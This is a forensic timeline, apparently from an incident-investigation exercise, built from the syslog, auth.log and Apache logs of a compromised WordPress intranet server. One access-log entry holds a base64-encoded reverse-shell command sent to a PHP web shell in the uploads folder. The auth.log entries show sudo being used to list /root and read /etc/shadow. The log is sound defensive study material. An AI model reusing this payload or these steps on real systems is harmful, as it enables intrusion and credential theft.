01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Started Session c1 of user phopkins.,[systemd  pid: 1] Started Session c1 of user phopkins.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Starting User Manager for UID 1001...,[systemd  pid: 1] Starting User Manager for UID 1001...,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[su  pid: 28816] pam_unix(su:session): session opened for user phopkins by (u...,[su  pid: 28816] pam_unix(su:session): session opened for user phopkins by (uid=33),2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Listening on GnuPG cryptographic agent (ssh-agent emula...,[systemd  pid: 28817] Listening on GnuPG cryptographic agent (ssh-agent emulation).,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Reached target Sockets.,[systemd  pid: 28817] Reached target Sockets.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Listening on GnuPG cryptographic agent and passphrase c...,[systemd  pid: 28817] Listening on GnuPG cryptographic agent and passphrase cache (restricted).,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Started User Manager for UID 1001.,[systemd  pid: 1] Started User Manager for UID 1001.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Reached target Timers.,[systemd  pid: 28817] Reached target Timers.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Reached target Basic System.,[systemd  pid: 28817] Reached target Basic System.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Listening on REST API socket for snapd user session agent.,[systemd  pid: 28817] Listening on REST API socket for snapd user session agent.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Startup finished in 415ms.,[systemd  pid: 28817] Startup finished in 415ms.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Reached target Paths.,[systemd  pid: 28817] Reached target Paths.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Listening on GnuPG network certificate management daemon.,[systemd  pid: 28817] Listening on GnuPG network certificate management daemon.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Listening on GnuPG cryptographic agent and passphrase c...,[systemd  pid: 28817] Listening on GnuPG cryptographic agent and passphrase cache (access for web browsers).,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Listening on GnuPG cryptographic agent and passphrase c...,[systemd  pid: 28817] Listening on GnuPG cryptographic agent and passphrase cache.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Reached target Default.,[systemd  pid: 28817] Reached target Default.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:41,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/...,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:43,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sudo] pam_unix(sudo:session): session opened for user root by (uid=0),[sudo] pam_unix(sudo:session): session opened for user root by (uid=0),2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:43,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sudo] pam_unix(sudo:session): session closed for user root,[sudo] pam_unix(sudo:session): session closed for user root,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:43,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/...,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/ls -laR /root/,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:49,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sudo] pam_unix(sudo:session): session opened for user root by (uid=0),[sudo] pam_unix(sudo:session): session opened for user root by (uid=0),2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:49,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sudo] pam_unix(sudo:session): session closed for user root,[sudo] pam_unix(sudo:session): session closed for user root,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:49,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/...,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
02/19/2022,07:23:40,UTC,M...,FILE,File stat,Content Modification Time,-,-,D:\dataset\evidences\apache2\error.log,OS:D:\dataset\evidences\apache2\error.log Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\apache2\error.log,844424930283131,-,filestat,file_size: 284534; file_system_type: OS; is_allocated: True; sha256_hash: be1c1bb0089572f3e1a67efc34b7268b190bbafd74bc6e713a7f75f2e8a44aad
11/01/2025,23:08:48,UTC,...B,FILE,File stat,Creation Time,-,-,D:\dataset\evidences,OS:D:\dataset\evidences Type: directory Owner identifier: 0 Group identifier: 0 Mode: 0o777 Number of links: 1,2,OS:D:\dataset\evidences,844424930283120,-,filestat,file_size: 4096; file_system_type: OS; is_allocated: True
11/01/2025,23:08:48,UTC,...B,FILE,File stat,Creation Time,-,-,D:\dataset\evidences\auth.log,OS:D:\dataset\evidences\auth.log Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\auth.log,844424930283121,-,filestat,file_size: 2075; file_system_type: OS; is_allocated: True; sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
11/01/2025,23:08:48,UTC,...B,FILE,File stat,Creation Time,-,-,D:\dataset\evidences\syslog,OS:D:\dataset\evidences\syslog Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\syslog,844424930283124,-,filestat,file_size: 2511; file_system_type: OS; is_allocated: True; sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
11/01/2025,23:08:48,UTC,...B,FILE,File stat,Creation Time,-,-,D:\dataset\evidences\apache2,OS:D:\dataset\evidences\apache2 Type: directory Owner identifier: 0 Group identifier: 0 Mode: 0o777 Number of links: 1,2,OS:D:\dataset\evidences\apache2,844424930283128,-,filestat,file_size: 4096; file_system_type: OS; is_allocated: True
11/01/2025,23:08:48,UTC,...B,FILE,File stat,Creation Time,-,-,D:\dataset\evidences\apache2\error.log,OS:D:\dataset\evidences\apache2\error.log Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\apache2\error.log,844424930283131,-,filestat,file_size: 284534; file_system_type: OS; is_allocated: True; sha256_hash: be1c1bb0089572f3e1a67efc34b7268b190bbafd74bc6e713a7f75f2e8a44aad
11/01/2025,23:08:48,UTC,...B,FILE,File stat,Creation Time,-,-,D:\dataset\evidences\apache2\access.log,OS:D:\dataset\evidences\apache2\access.log Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\apache2\access.log,844424930283136,-,filestat,file_size: 31109; file_system_type: OS; is_allocated: True; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
11/01/2025,23:14:12,UTC,M...,FILE,File stat,Content Modification Time,-,-,D:\dataset\evidences\apache2,OS:D:\dataset\evidences\apache2 Type: directory Owner identifier: 0 Group identifier: 0 Mode: 0o777 Number of links: 1,2,OS:D:\dataset\evidences\apache2,844424930283128,-,filestat,file_size: 4096; file_system_type: OS; is_allocated: True
11/01/2025,23:17:05,UTC,M...,FILE,File stat,Content Modification Time,-,-,D:\dataset\evidences,OS:D:\dataset\evidences Type: directory Owner identifier: 0 Group identifier: 0 Mode: 0o777 Number of links: 1,2,OS:D:\dataset\evidences,844424930283120,-,filestat,file_size: 4096; file_system_type: OS; is_allocated: True
11/01/2025,23:19:01,UTC,MA..,FILE,File stat,Content Modification Time; Last Access Time,-,-,D:\dataset\evidences\apache2\access.log,OS:D:\dataset\evidences\apache2\access.log Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\apache2\access.log,844424930283136,-,filestat,file_size: 31109; file_system_type: OS; is_allocated: True; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
11/01/2025,23:19:02,UTC,.A..,FILE,File stat,Last Access Time,-,-,D:\dataset\evidences\apache2,OS:D:\dataset\evidences\apache2 Type: directory Owner identifier: 0 Group identifier: 0 Mode: 0o777 Number of links: 1,2,OS:D:\dataset\evidences\apache2,844424930283128,-,filestat,file_size: 4096; file_system_type: OS; is_allocated: True
11/01/2025,23:19:42,UTC,.A..,FILE,File stat,Last Access Time,-,-,D:\dataset\evidences\apache2\error.log,OS:D:\dataset\evidences\apache2\error.log Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\apache2\error.log,844424930283131,-,filestat,file_size: 284534; file_system_type: OS; is_allocated: True; sha256_hash: be1c1bb0089572f3e1a67efc34b7268b190bbafd74bc6e713a7f75f2e8a44aad
11/01/2025,23:20:35,UTC,MA..,FILE,File stat,Content Modification Time; Last Access Time,-,-,D:\dataset\evidences\auth.log,OS:D:\dataset\evidences\auth.log Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\auth.log,844424930283121,-,filestat,file_size: 2075; file_system_type: OS; is_allocated: True; sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
11/01/2025,23:20:59,UTC,MA..,FILE,File stat,Content Modification Time; Last Access Time,-,-,D:\dataset\evidences\syslog,OS:D:\dataset\evidences\syslog Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\syslog,844424930283124,-,filestat,file_size: 2511; file_system_type: OS; is_allocated: True; sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
11/01/2025,23:23:27,UTC,.A..,FILE,File stat,Last Access Time,-,-,D:\dataset\evidences,OS:D:\dataset\evidences Type: directory Owner identifier: 0 Group identifier: 0 Mode: 0o777 Number of links: 1,2,OS:D:\dataset\evidences,844424930283120,-,filestat,file_size: 4096; file_system_type: OS; is_allocated: True
01/18/2022,13:13:52,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,OPTIONS * HTTP/1.0 from: ::1,http_request: OPTIONS * HTTP/1.0 from: ::1 code: 200 user_agent: Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 110; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:14:18,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 506717; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
